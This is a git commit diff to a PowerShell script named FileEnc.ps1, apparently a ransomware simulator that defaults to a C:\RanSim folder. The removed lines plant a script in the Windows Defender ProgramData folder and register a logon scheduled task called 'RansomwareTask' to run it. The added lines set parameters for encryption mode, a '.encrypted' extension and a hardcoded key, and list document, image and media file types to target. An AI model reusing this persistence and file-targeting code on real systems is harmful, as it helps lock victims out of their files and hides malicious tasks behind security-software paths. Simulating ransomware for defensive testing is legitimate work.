342889bda4825db974544703324119dc7430d80e
MajesticBear01 <rubyroguerecon@proton.me>
2024-10-16 19:17:14 -0700

    Update FileEnc.ps1

--- FileEnc.ps1
+++ FileEnc.ps1
@@ -1,24 +1,8 @@
-# Get the current user's SID
-$userSID = (Get-LocalUser -Name (whoami)).SID
+param([string]$Mode,
+      [string]$TargetPath = "C:\RanSim",
+      [string]$Extension = ".encrypted",
+      [string]$Key = "Q5KyUru6wn82hlY9k8xUjJOPIC9da41jgRkpt21jo2L="
+)
 
-# Define the path to the Windows Defender folder
-$defenderPath = "C:\ProgramData\Microsoft\Windows Defender"
-
-# Create a new folder in the Windows Defender folder for the user
-New-Item -Path $defenderPath -Name $userSID -ItemType "directory" -Force
-
-# Copy a script to the user's folder to trigger the ransomware behavior
-Copy-Item "C:\ransomware_script.ps1" -Destination "$defenderPath\$userSID\ransomware_script.ps1"
-
-# Define the path to the user's folder
-$userFolder = "$defenderPath\$userSID"
-
-# Create a scheduled task to run the ransomware script
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File $userFolder\ransomware_script.ps1"
-$trigger = New-ScheduledTaskTrigger -AtLogOn
-$settings = New-ScheduledTaskSettingsSet
-$principal = New-ScheduledTaskPrincipal -UserId $userSID -LogonType Interactive
-Register-ScheduledTask -TaskName "RansomwareTask" -Action $action -Trigger $trigger -Settings $settings -Principal $principal
-
-# Start the scheduled task
-Start-ScheduledTask -TaskName "RansomwareTask"
+# Define target file types
+$TargetFiles = '*.pdf','*.xls*','*.ppt*','*.doc*','*.accd*','*.rtf','*.txt','*.csv','*.jpg','*.jpeg','*.png','*.gif','*.avi','*.midi','*.mov','*.mp3','*.mp4','*.mpeg','*.mpeg2','*.mpeg3','*.mpg','*.ogg'
